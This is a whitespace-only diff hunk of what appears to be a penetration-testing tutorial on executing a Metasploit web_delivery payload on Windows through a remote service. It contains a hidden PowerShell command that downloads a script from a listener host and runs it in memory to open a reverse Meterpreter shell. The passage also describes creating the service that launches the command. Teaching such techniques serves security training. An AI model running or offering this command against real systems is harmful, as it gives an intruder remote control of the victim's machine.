@@ -25,7 +25,7 @@ As smbexec demonstrated, it's possible to execute commands directly from service
 We'll use Metasploit's `web_delivery` module and choose a PowerShell target with a reverse Meterpreter payload. The listener is set up and it tells us the command to execute on the target machine:
 
 ```text
-powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');  
+powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
 ```
 
 From our Windows attack box, we create a remote service \("metpsh"\) and set the binPath to execute cmd.exe with our payload:
@@ -37,8 +37,6 @@ And then start it:
 ![](../../.gitbook/assets/sc_psh_start.png)
 
 It errors out because our service doesn't respond, but if we look at our Metasploit listener we see that the callback was made and the payload executed.
-
-
 
 All the info was extracted from here: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
